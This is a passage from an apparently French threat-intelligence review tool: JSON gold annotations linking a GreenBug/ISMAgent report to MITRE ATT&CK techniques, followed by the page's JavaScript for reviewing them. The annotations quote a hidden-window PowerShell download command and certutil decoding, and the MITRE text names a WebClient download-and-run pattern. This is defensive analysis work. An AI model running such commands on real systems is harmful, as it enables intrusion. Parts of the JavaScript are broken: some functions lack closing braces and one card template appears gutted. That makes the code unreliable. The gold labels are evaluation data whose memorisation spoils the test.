"quotes": [{"text": "“C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe” -nologo -WindowStyle Hidden $webClient = New-Object", "anchor": {"status": "exact", "occurrences": [{"start": 1064, "end": 1175, "section": ["change managment.dot"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["execution"], "attack": {"status": "ok", "msg": "T1059.001 PowerShell (ATT&CK v20.0)", "official": "PowerShell", "description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. PowerShell can also be installed on Linux and macOS. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).", "url": "https://attack.mitre.org/techniques/T1059/001"}, "rel_count": 1, "sequence": null, "extra": {}, "fp": "1e6ab7831e22"}, {"id": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add", "kind": "entity", "type": "attack-pattern", "name": "Ingress Tool Transfer", "ext_id": "T1105", "label": "gold:required", "quotes": [{"text": "The command downloads  _ntluca.txt_ from", "anchor": {"status": "exact", "occurrences": [{"start": 1362, "end": 1402, "section": ["change managment.dot"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["command-and-control"], "attack": {"status": "ok", "msg": "T1105 Ingress Tool Transfer (ATT&CK v20.0)", "official": "Ingress Tool Transfer", "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer).\n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.  A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.", "url": "https://attack.mitre.org/techniques/T1105"}, "rel_count": 1, "sequence": null, "extra": {}, "fp": "7512c1fe3375"}, {"id": "attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0", "kind": "entity", "type": "attack-pattern", "name": "Hidden Window", "ext_id": "T1564.003", "label": "gold:acceptable", "quotes": [{"text": "-nologo -WindowStyle Hidden", "anchor": {"status": "exact", "occurrences": [{"start": 1124, "end": 1151, "section": ["change managment.dot"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["stealth"], "attack": {"status": "ok", "msg": "T1564.003 Hidden Window (ATT&CK v20.0)", "official": "Hidden Window", "description": "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks.\n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.\n\nOn macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be apple.awt.UIElement, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nSimilarly, on Windows there are a variety of features in scripting languages, such as PowerShell, Jscript, and Visual Basic to make windows hidden. One example of this is powershell.exe -WindowStyle Hidden.\n\nThe Windows Registry can also be edited to hide application windows from the current user. For example, by setting the `WindowPosition` subkey in the `HKEY_CURRENT_USER\\Console\\%SystemRoot%_System32_WindowsPowerShell_v1.0_PowerShell.exe` Registry key to a maximum value, PowerShell windows will open off screen and be hidden.\n\nIn addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding explorer.exe process.  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session, will be invisible to other desktops windows.\n\nAdversaries may also leverage cmd.exe as a parent process, and then utilize a LOLBin, such as DeviceCredentialDeployment.exe, to hide windows.", "url": "https://attack.mitre.org/techniques/T1564/003"}, "rel_count": 1, "sequence": null, "extra": {"x_gold_context": "Artefact : option -WindowStyle Hidden de la commande PowerShell (section « change managment.dot »). Le texte ne commente pas cette option."}, "fp": "adbf8b015f96"}, {"id": "attack-pattern--0d91b3c0-5e50-47c3-949a-2a796f04d144", "kind": "entity", "type": "attack-pattern", "name": "Encrypted/Encoded File", "ext_id": "T1027.013", "label": "gold:required", "quotes": [{"text": "Disguised as a base64 digital certificate, the file actually decodes to an ISMagent sample", "anchor": {"status": "exact", "occurrences": [{"start": 1517, "end": 1607, "section": ["change managment.dot"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["stealth"], "attack": {"status": "ok", "msg": "T1027.013 Encrypted/Encoded File (ATT&CK v20.0)", "official": "Encrypted/Encoded File", "description": "Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution).\n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.", "url": "https://attack.mitre.org/techniques/T1027/013"}, "rel_count": 1, "sequence": null, "extra": {}, "fp": "02e2542df4d2"}, {"id": "attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c", "kind": "entity", "type": "attack-pattern", "name": "Deobfuscate/Decode Files or Information", "ext_id": "T1140", "label": "gold:required", "quotes": [{"text": "decoded via certutil.exe", "anchor": {"status": "exact", "occurrences": [{"start": 553, "end": 577, "section": []}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["stealth"], "attack": {"status": "ok", "msg": "T1140 Deobfuscate/Decode Files or Information (ATT&CK v20.0)", "official": "Deobfuscate/Decode Files or Information", "description": "Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows copy /b or type command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.", "url": "https://attack.mitre.org/techniques/T1140"}, "rel_count": 2, "sequence": null, "extra": {}, "fp": "f90351a18844"}], "relations": [{"id": "relationship--fd12a21b-f82d-5467-b43c-0228a3972084", "kind": "relation", "relationship_type": "attributed-to", "source_ref": "campaign--6b69cc1f-b800-509a-bf4c-373bc1c45a05", "target_ref": "intrusion-set--f1a371ab-5eb3-5bd4-b46c-84343338a5b8", "label": "gold:required", "quotes": [{"text": "Recent ISMAgent Samples and Infrastructure by Iranian Threat Group GreenBug", "anchor": {"status": "exact", "occurrences": [{"start": 2, "end": 77, "section": []}]}}], "flags": [], "severity": 0, "justification": "Le titre attribue les échantillons et l'infrastructure à GreenBug ; l'article présente ces échantillons comme la nouvelle campagne. Niveau de confiance non précisé.", "confidence": null, "extra": {}, "fp": "bbbd5ae25e47"}, {"id": "relationship--c7cddcd6-caea-50c8-bb64-c66c46f4a28e", "kind": "relation", "rela <script>
(function(){
'use strict';
const D = JSON.parse(document.getElementById('review-data').textContent);
const TEXT = D.article.text;
const CTX = 220, CTX_MORE = 700;
const ENT = new Map(D.entities.map(e => [e.id, e]));
const REL = D.relations;
const REJ = D.rejected;
const ITEMS = new Map([...D.entities, ...REL, ...REJ].map(i => [i.id, i]));
const VERDICTS = {ok:{label:'Correct', icon:'✓'}, fix:{label:'À corriger', icon:'~'}, ko:{label:'Non justifié', icon:'✗'}};
const REJ_VERDICTS = {ok:{label:'Rejet confirmé', icon:'✓'}, fix:{label:'À intégrer au gold', icon:'+'}};
const QSTATUS = {normalized:'normalisée', fuzzy:'approximative'};
const TYPE_ORDER = ['intrusion-set','threat-actor','campaign','incident','malware','tool','infrastructure','attack-pattern','software','vulnerability','location','identity'];
const ICON = {error:'●', warn:'▲', info:'i'};

/* ---------- Stockage ---------- */
const KEY = 'stix-review:' + D.meta.key;
let S = {verdicts:{}, reviewer:''};
try { const raw = localStorage.getItem(KEY); if (raw) S = Object.assign(S, JSON.parse(raw)); } catch (e) {}
function save(){ try { localStorage.setItem(KEY, JSON.stringify(S)); } catch (e) {} }
function verdictOf(id){ return (S.verdicts[id] || {}).v || 'pending'; }

/* ---------- Utilitaires ---------- */
const esc = s => String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
const typeKey = t => ['campaign','intrusion-set','threat-actor','malware','tool','attack-pattern','location','identity'].includes(t) ? t : 'other';
const typeOf = id => (ENT.get(id) || {}).type || 'absent';
const nameOf = id => { const e = ENT.get(id); return e ? (e.ext_id ? e.ext_id + ' ' : '') + e.name : id; };
const typeRank = t => { const i = TYPE_ORDER.indexOf(t); return i < 0 ? 99 : i; };
const hasAlert = it => it.flags.some(f => f.level !== 'info');
const byId = id => document.querySelector('[data-card="' + CSS.escape(id) + '"]');

function chip(id, small){
  const e = ENT.get(id);
  if (!e) return `<span class="node t-missing${small?' sm':''}"><span class="ntype">référence absente</span><span class="nname">${esc(id)}</span></span>`;
  const sub = !small && e.type === 'attack-pattern' && e.tactics.length ? `<span class="nsub">${esc(e.tactics.join(' · '))}</span>` : '';
  return `<span class="node t-${typeKey(e.type)}${small?' sm':''}" title="${esc(e.type + ' · ' + e.id)}"><span class="ntype">${esc(e.ext_id || e.type)}</span><span class="nname">${esc(e.name)}</span>${sub}</span>`;
}
function labelBadge(l){
  if (!l) return '<span class="lbl lbl-none">sans label</span>';
  const k = l.replace('gold:', '');
  return `<span class="lbl lbl-${k==='required'?'req':k==='acceptable'?'acc':'other'}">${esc(k)}</span>`;
}
function flagsHtml(flags){
  if (!flags.length) return '';
  return '<ul class="flags">' + flags.map(f => `<li class="flag f-${f.level}"><span aria-hidden="true">${ICON[f.level]}</span><div>${esc(f.msg)}</div></li>`).join('') + '</ul>';
}
function tripletHtml(r, small){
  return `${chip(r.source_ref, small)}<span class="edge"><span class="ln"></span>${esc(r.relationship_type)}<span aria-hidden="true">→</span></span>${chip(r.target_ref, small)}`;
}

/* ---------- Citations en contexte ---------- */
function quotesHtml(item){
  if (!item.quotes || !item.quotes.length) return '<div class="quote"><div class="ctx-missing">Aucune citation fournie.</div></div>';
  return item.quotes.map((q, qi) => `<div class="quote" data-item="${esc(item.id)}" data-q="${qi}" data-o="0" data-r="${CTX}">${quoteInner(item, qi, 0, CTX)}</div>`).join('');
}
function quoteInner(item, qi, oi, radius){
  const q = item.quotes[qi], a = q.anchor;
  if (!a.occurrences.length){
    let h = `<div class="ctx-missing"><div class="qraw">« ${esc(q.text)} »</div><div class="cand">Introuvable dans l'article.</div>`;
    if (a.candidate) h += `<div class="cand">Passage le plus proche (${Math.round(a.score*100)} %) : « ${esc(a.candidate)} »</div>`;
    return h + '</div>';
  }
  const o = a.occurrences[oi];
  let s = Math.max(0, o.start - radius), e = Math.min(TEXT.length, o.end + radius);
  if (s > 0){ const sp = TEXT.indexOf(' ', s); if (sp > -1 && sp < o.start) s = sp + 1; }
  if (e < TEXT.length){ const sp = TEXT.lastIndexOf(' ', e); if (sp > o.end) e = sp; }
  const tight = t => esc(t.replace(/\n\s*\n[\s\n]*/g, '\n\n'));
  const ctx = (s > 0 ? '… ' : '') + tight(TEXT.slice(s, o.start)) + '<mark>' + esc(TEXT.slice(o.start, o.end)) + '</mark>' + tight(TEXT.slice(o.end, e)) + (e < TEXT.length ? ' …' : '');
  const n = a.occurrences.length;
  const nav = n > 1 ? `<span class="occ"><button type="button" class="mini" data-act="occ" data-d="-1" ${oi===0?'disabled':''} aria-label="Occurrence précédente">‹</button>occurrence ${oi+1}/${n}<button type="button" class="mini" data-act="occ" data-d="1" ${oi===n-1?'disabled':''} aria-label="Occurrence suivante">›</button></span>` : '';
  const st = QSTATUS[a.status] ? `<span class="qstatus qs-${a.status}">citation ${QSTATUS[a.status]}${a.status==='fuzzy' ? ' ' + Math.round(a.score*100) + ' %' : ''}</span>` : '';
  return `<blockquote class="ctx">${ctx}</blockquote>
    <div class="where"><span class="sec">§ ${esc(o.section.join(' › ') || 'Début de l’article')}</span>${nav}${st}
      <span class="actions"><button type="button" class="mini" data-act="more">${radius > CTX ? 'Moins de contexte' : 'Plus de contexte'}</button><button type="button" class="mini" data-act="goto">Voir dans l’article</button></span></div>`;
}

/* ---------- Verdicts ---------- */
function verdictHtml(item){
  const V = item.kind === 'rejected' ? REJ_VERDICTS : VERDICTS;
  const cur = S.verdicts[item.id] || {};
  const btns = Object.entries(V).map(([k, v]) => `<button type="button" class="vbtn vb-${k}${cur.v===k?' on':''}" data-act="verdict" data-v="${k}" aria-pressed="${cur.v===k}">${v.icon} ${v.label}</button>`).join('');
  const stale = cur.v && cur.fp && cur.fp !== item.fp ? '<div class="stale">▲ L’objet a changé depuis ce verdict : à revérifier.</div>' : '';
  return `<div class="verdict">${stale}<div class="vbtns" role="group" aria-label="Verdict">${btns}</div><textarea class="vcomment" rows="1" data-act="comment" placeholder="Commentaire : autre cible, autre label, citation à allonger…">${esc(cur.c || '')}</textarea></div>`;
}
function setVerdict(id, v){
  const item = ITEMS.get(id); if (!item) return;
  const cur = S.verdicts[id] || {};
  if (cur.v === v) delete cur.v; else { cur.v = v; cur.fp = item.fp; }
  cur.t = new Date().toISOString();
  S.verdicts[id] = cur; save();
  document.querySelectorAll('[data-card="' + CSS.escape(id) + '"]').forEach(card => {
    card.classList.remove('v-ok','v-fix','v-ko','v-pending'); card.classList.add('v-' + (cur.v || 'pending'));
    card.querySelectorAll('.vbtn').forEach(b => { const on = b.dataset.v === cur.v; b.classList.toggle('on', on); b.setAttribute('aria-pressed', on); });
    const st = card.querySelector('.stale'); if (st) st.remove();
  });
  renderProgress();
  if (state.tab === 'matrix') renderMatrix();
}

/* ---------- Cartes ---------- */
function extraHtml(extra){
  const keys = Object.keys(extra || {});
  if (!keys.length) return '';
  return '<div class="extra">' + keys.map(k => esc(k) + ' : ' + esc(typeof extra[k] === 'string' ? extra[k] : JSON.stringify(extra[k]))).join('<br>') + '</div>';
}
function mitreHtml(id){
  const e = ENT.get(id), a = e && e.attack;
  if (!a || !a.description) return '';
  const paras = a.description.split(/\n\s*\n/).map(p => p.trim()).filter(Boolean);
  const more = paras.length > 1 ? `<details><summary>Lire la suite (${paras.length - 1} paragraphe${paras.length > 2 ? 's' : ''})</summary>${paras.slice(1).map(p => `<p>${esc(p)}</p>`).join('')}</details>` : '';
  const link = a.url ? `<a href="${esc(a.url)}" target="_blank" rel="noopener noreferrer">attack.mitre.org ↗</a>` : '';
  return `<div class="mitre"><div class="mitre-head"><span>Définition MITRE · ${esc(e.ext_id)} ${esc(a.official)}</span>${link}</div><p>${esc(paras[0])}</p>${more}</div>`;
}
function relCard(r){
  return `<article class="card v-${verdictOf(r.id)}" data-card="${esc(r.id)}" tabindex="-1">

    ${typeOf(r.target_ref) === 'attack-pattern' ? mitreHtml(r.target_ref) : ''}

    ${extraHtml(r.extra)}${verdictHtml(r)}</article>`;

function seqHtml(seq){
  if (!seq || !seq.length) return '';
  const li = seq.map(s => `<li><div>${esc(s.summary || '')}${s.concurrent ? ' <em>(concurrent)</em>' : ''}</div><div>${(s.techniques||[]).map(t => `<span class="tid">${esc(t)}</span>`).join('')}${(s.techniques_acceptable||[]).map(t => `<span class="tid acc" title="acceptable">${esc(t)}</span>`).join('')}</div></li>`).join('');
  return `<details class="seq"><summary>Séquence x_gold_sequence (${seq.length} étapes)</summary><ol>${li}</ol></details>`;
}
function entCard(e){
  const a = e.attack ? `<div class="attack a-${e.attack.status}"><span aria-hidden="true">${e.attack.status==='ok'?'✓':e.attack.status==='unchecked'?'?':'▲'}</span>${esc(e.attack.msg)}</div>` : '';
  return `<article class="card v-${verdictOf(e.id)}" data-card="${esc(e.id)}" tabindex="-1">
    <div class="ent-head">${chip(e.id)}<span class="spacer"></span>${labelBadge(e.label)}</div>

    ${flagsHtml(e.flags)}${quotesHtml(e)}${seqHtml(e.sequence)}${extraHtml(e.extra)}
    <div class="meta-line"><button type="button" class="mini" data-act="ent-rels" data-id="${esc(e.id)}">Voir ses ${e.rel_count} relation${e.rel_count>1?'s':''}</button></div>
    ${verdictHtml(e)}</article>`;
}
function rejCard(r){
  return `<article class="card v-${verdictOf(r.id)}" data-card="${esc(r.id)}" tabindex="-1">
    <div class="triplet"><span class="node t-missing"><span class="ntype">candidat rejeté</span><span class="nname">${esc(r.candidat)}</span></span></div>
    <p class="just"><strong>Raison</strong>${esc(r.raison)}</p>${flagsHtml(r.flags)}${verdictHtml(r)}</article>`;

/* ---------- État, filtres ---------- */
const state = {tab:'relations', only:null, onlyLabel:''};
const F = {q:'', entity:'', rtype:'', ttype:'', label:'', status:'', sort:'alerts', alerts:false};
const $ = id => document.getElementById(id);

function fillSelect(sel, values, allLabel){
  sel.innerHTML = `<option value="">${allLabel}</option>` + values.map(([v, l]) => `<option value="${esc(v)}">${esc(l)}</option>`).join('');
}
function setupFilters(){
  const ents = [...D.entities].sort((a, b) => typeRank(a.type) - typeRank(b.type) || (a.ext_id||a.name).localeCompare(b.ext_id||b.name));
  fillSelect($('f-entity'), ents.map(e => [e.id, (e.ext_id ? e.ext_id + ' ' : '') + e.name + ' (' + e.type + ')']), 'Toutes');
  fillSelect($('f-rtype'), [...new Set(REL.map(r => r.relationship_type))].sort().map(t => [t, t]), 'Tous');
  [['f-q','q','input'],['f-entity','entity','change'],['f-rtype','rtype','change'],['f-ttype','ttype','change'],['f-label','label','change'],['f-status','status','change'],['f-sort','sort','change']]
    .forEach(([id, k, ev]) => $(id).addEventListener(ev, () => { F[k] = k === 'q' ? $(id).value.trim().toLowerCase() : $(id).value; clearOnly(); renderTab(); }));
  $('f-alerts').addEventListener('change', () => { F.alerts = $('f-alerts').checked; clearOnly(); renderTab(); });
  $('f-reset').addEventListener('click', resetFilters);
  $('f-toggle').addEventListener('click', () => { const o = $('filters').classList.toggle('open'); $('f-toggle').setAttribute('aria-expanded', o); measure(); });
}
function resetFilters(){
  Object.assign(F, {q:'', entity:'', rtype:'', ttype:'', label:'', status:'', alerts:false});
  ['f-q','f-entity','f-rtype','f-ttype','f-label','f-status'].forEach(id => $(id).value = '');
  $('f-alerts').checked = false; clearOnly(); renderTab();
}
function syncTypeFilter(){
  const isRel = state.tab === 'relations';
  $('f-ttype-lab').textContent = isRel ? 'Type de cible' : 'Type d’entité';
  const types = isRel ? REL.map(r => typeOf(r.target_ref)) : D.entities.map(e => e.type);
  const cur = F.ttype;
  fillSelect($('f-ttype'), [...new Set(types)].sort((a,b) => typeRank(a)-typeRank(b)).map(t => [t, t]), 'Tous');
  $('f-ttype').value = types.includes(cur) ? cur : ''; F.ttype = $('f-ttype').value;
  document.querySelectorAll('[data-only="relations"]').forEach(el => el.style.display = isRel ? '' : 'none');
}
function clearOnly(){ state.only = null; state.onlyLabel = ''; }
function textOf(it){
  const parts = it.kind === 'relation' ? [nameOf(it.source_ref), it.relationship_type, nameOf(it.target_ref), it.justification]
    : [it.ext_id, it.name, it.type, (it.aliases||[]).join(' '), it.description];
  return (parts.join(' ') + ' ' + (it.quotes||[]).map(q => q.text).join(' ')).toLowerCase();
}
function common(it){
  if (F.label && it.label !== F.label) return false;
  if (F.status && verdictOf(it.id) !== F.status) return false;
  if (F.alerts && !hasAlert(it)) return false;
  if (F.q && !textOf(it).includes(F.q)) return false;
  return true;
}
function relVisible(r){
  if (state.only) return state.only.includes(r.id);
  if (F.entity && r.source_ref !== F.entity && r.target_ref !== F.entity) return false;
  if (F.rtype && r.relationship_type !== F.rtype) return false;
  if (F.ttype && typeOf(r.target_ref) !== F.ttype) return false;
  return common(r);
}
function entVisible(e){
  if (state.only) return state.only.includes(e.id);
  if (F.entity && e.id !== F.entity) return false;
  if (F.ttype && e.type !== F.ttype) return false;
  return common(e);
}

/* ---------- Rendu des onglets ---------- */
const TABS = [['relations','Triplets', () => REL.length], ['entities','Entités', () => D.entities.length], ['matrix','Matrice', null], ['article','Article', null]];
if (REJ.length) TABS.push(['rejected','Candidats rejetés', () => REJ.length]);
function renderTabs(){
  $('tabs').innerHTML = TABS.map(([k, l, n]) => `<button type="button" role="tab" data-tab="${k}" aria-selected="${state.tab===k}">${l}${n ? `<span class="n">${n()}</span>` : ''}</button>`).join('');
}
function setTab(k){
  state.tab = k; renderTabs();
  $('layout').classList.toggle('full', !['relations','entities'].includes(k));
  if (k !== 'article') $('panel').hidden = true;
  syncTypeFilter(); renderTab(); window.scrollTo({top:0});
}
function focusBar(){
  return state.only ? `<div class="focusbar"><span>Affichage limité : ${esc(state.onlyLabel)}</span><button type="button" class="mini" data-act="clear-only">Tout afficher</button></div>` : '';
}
function globalHtml(){
  if (!D.global_flags.length) return '';
  return `<section class="global"><h2>Contrôles globaux du bundle</h2>${flagsHtml(D.global_flags)}</section>`;
}
function sortItems(list, kind){
  const sev = (a, b) => b.severity - a.severity;
  if (F.sort === 'bundle') return list;
  if (kind === 'relation'){
    const src = (a, b) => typeRank(typeOf(a.source_ref)) - typeRank(typeOf(b.source_ref)) || nameOf(a.source_ref).localeCompare(nameOf(b.source_ref));
    const tgt = (a, b) => typeRank(typeOf(a.target_ref)) - typeRank(typeOf(b.target_ref)) || nameOf(a.target_ref).localeCompare(nameOf(b.target_ref));
    if (F.sort === 'source') return list.sort((a, b) => src(a, b) || tgt(a, b));
    if (F.sort === 'target') return list.sort((a, b) => tgt(a, b) || src(a, b));
    return list.sort((a, b) => sev(a, b) || src(a, b) || tgt(a, b));
  }
  const nm = (a, b) => typeRank(a.type) - typeRank(b.type) || (a.ext_id||a.name).localeCompare(b.ext_id||b.name);
  return list.sort((a, b) => F.sort === 'alerts' ? (sev(a, b) || nm(a, b)) : nm(a, b));
}
function renderRelations(){
  const list = sortItems(REL.filter(relVisible), 'relation');
  let html = globalHtml() + focusBar() + `<div class="listhead"><span>${list.length} / ${REL.length} relations affichées</span></div>`;
  if (!list.length) return html + '<div class="empty">Aucune relation ne correspond aux filtres.</div>';
  const groupKey = F.sort === 'source' ? r => r.source_ref : F.sort === 'target' ? r => r.target_ref : null;
  let last = null;
  for (const r of list){
    if (groupKey && groupKey(r) !== last){ last = groupKey(r); html += `<h3 class="group">${chip(last, true)}</h3>`; }
    html += relCard(r);
  }
  return html;
}
function renderEntities(){
  const list = sortItems(D.entities.filter(entVisible), 'entity');
  let html = focusBar() + `<div class="listhead"><span>${list.length} / ${D.entities.length} entités affichées</span></div>`;
  if (!list.length) return html + '<div class="empty">Aucune entité ne correspond aux filtres.</div>';
  let last = null;
  for (const e of list){
    if (F.sort !== 'alerts' && e.type !== last){ last = e.type; html += `<h3 class="group">${esc(e.type)}</h3>`; }
    html += entCard(e);
  }
  return html;
}
function renderRejected(){
  return `<div class="listhead"><span>${REJ.length} candidats envisagés puis écartés à l’annotation. Confirmez le rejet ou demandez l’intégration au gold.</span></div>` + REJ.map(rejCard).join('');
}
function renderMatrix(){
  const uses = REL.filter(r => typeOf(r.target_ref) === 'attack-pattern');
  if (!uses.length){ $('main').innerHTML = '<div class="empty">Aucune relation vers un attack-pattern.</div>'; return; }
  const srcs = [...new Set(uses.map(r => r.source_ref))].sort((a, b) => typeRank(typeOf(a)) - typeRank(typeOf(b)) || nameOf(a).localeCompare(nameOf(b)));
  const aps = [...new Set(uses.map(r => r.target_ref))].sort((a, b) => nameOf(a).localeCompare(nameOf(b), undefined, {numeric:true}));
  const cell = new Map(uses.map(r => [r.source_ref + '|' + r.target_ref, r]));
  const head = `<tr><th class="rowh">Technique</th>${srcs.map(s => `<th>${chip(s, true)}</th>`).join('')}<th>Sources</th></tr>`;
  const rows = aps.map(ap => {
    const e = ENT.get(ap) || {name: ap, tactics: []};
    let n = 0;
    const tds = srcs.map(s => {
      const r = cell.get(s + '|' + ap); if (!r) return '<td></td>';
      n++;
      const v = verdictOf(r.id), lab = r.label === 'gold:required' ? 'req' : 'acc';
      const vm = v === 'pending' ? '' : `<span class="vm ${v}">${VERDICTS[v].icon}</span>`;
      const tip = nameOf(s) + ' → ' + nameOf(ap) + '\n' + (r.quotes[0] ? '« ' + r.quotes[0].text + ' »' : 'sans citation');
      return `<td><button type="button" class="cell${hasAlert(r) ? ' al' : ''}" data-act="focus" data-ids="${esc(r.id)}" title="${esc(tip)}"><span class="b ${lab}">${lab === 'req' ? 'R' : 'A'}</span>${vm}</button></td>`;
    }).join('');
    const tip = e.attack && e.attack.description ? e.attack.description.split(/\n\s*\n/)[0] : '';
    return `<tr><th class="rowh" title="${esc(tip)}"><span class="ntype" style="font:600 11px var(--mono);color:var(--c-attack-pattern)">${esc(e.ext_id || '')}</span><span class="tname">${esc(e.name)}</span><span class="ttac">${esc((e.tactics||[]).join(' · '))}</span></th>${tds}<td>${n}</td></tr>`;
  }).join('');
  $('main').innerHTML = `<div class="legend"><span><span class="cell"><span class="b req">R</span></span> required</span><span><span class="cell"><span class="b acc">A</span></span> acceptable</span><span><span class="cell al"><span class="b req">R</span></span> relation avec alerte</span><span><b class="vm ok">✓</b> <b class="vm fix">~</b> <b class="vm ko">✗</b> verdict</span><span>Cliquer une case ouvre la relation.</span></div>
    <div class="matrix-wrap"><table class="matrix"><thead>${head}</thead><tbody>${rows}</tbody></table></div>`;
}

/* ---------- Article annoté ---------- */
let ARTICLE_HTML = null; const ANCHOR = new Map();
function buildArticle(){
  const iv = [];
  for (const it of [...D.entities, ...REL]) (it.quotes || []).forEach((q, qi) => q.anchor.occurrences.forEach((o, oi) => iv.push({s:o.start, e:o.end, id:it.id, key:it.id + '|' + qi + '|' + oi})));
  iv.forEach((v, i) => ANCHOR.set(v.key, i));
  const pts = [...new Set(iv.flatMap(v => [v.s, v.e]))].sort((a, b) => a - b);
  const startsAt = new Map(); iv.forEach((v, i) => { if (!startsAt.has(v.s)) startsAt.set(v.s, []); startsAt.get(v.s).push(i); });
  let html = '', ls = 0;
  for (const line of TEXT.split('\n')){
    const le = ls + line.length;
    const m = /^(#{1,6})\s/.exec(line);
    const cls = m ? 'l h' + m[1].length : (/^\*\*[^*]+\*\*\s*$/.test(line) ? 'l hb' : 'l');
    const cuts = [ls, ...pts.filter(p => p > ls && p < le), le];
    let inner = '';
    for (let k = 0; k < cuts.length - 1; k++){
      const a = cuts[k], b = cuts[k + 1];
      (startsAt.get(a) || []).forEach(i => inner += `<span id="anc-${i}"></span>`);
      if (a === b) continue;
      const seg = esc(TEXT.slice(a, b));
      const cover = []; iv.forEach((v, i) => { if (v.s <= a && v.e >= b) cover.push(i); });
      const ids = [...new Set(cover.map(i => iv[i].id))];
      inner += ids.length ? `<mark class="am${ids.length > 1 ? ' multi' : ''}" data-ids="${esc(ids.join(' '))}" data-k="${cover.join(' ')}">${seg}</mark>` : seg;
    }
    html += `<div class="${cls}">${inner}</div>`;
    ls = le + 1;
  }
  ARTICLE_HTML = html;
}
function renderArticle(){
  if (ARTICLE_HTML === null) buildArticle();
  $('main').innerHTML = `<div class="legend"><span><mark class="am">passage cité</mark> par un objet</span><span><mark class="am multi">passage cité</mark> par plusieurs objets</span><span>Cliquer un passage liste les objets qui le citent.</span></div><div class="article">${ARTICLE_HTML}</div>`;
}
function showPanel(ids){
  const items = ids.map(id => ITEMS.get(id)).filter(Boolean);
  const body = items.map(it => `<div class="pi"><div class="triplet">${it.kind === 'relation' ? tripletHtml(it, true) : chip(it.id, true)}<span class="spacer"></span>${labelBadge(it.label)}</div><div><button type="button" class="mini" data-act="focus" data-ids="${esc(it.id)}">Ouvrir dans la revue</button></div></div>`).join('');
  const p = $('panel');
  p.innerHTML = `<h2><span>${items.length} objet${items.length>1?'s':''} citant ce passage</span><button type="button" class="mini" data-act="close-panel" aria-label="Fermer">✕</button></h2>${body}`;
  p.hidden = false;
}
function gotoAnchor(itemId, qi, oi){
  setTab('article');
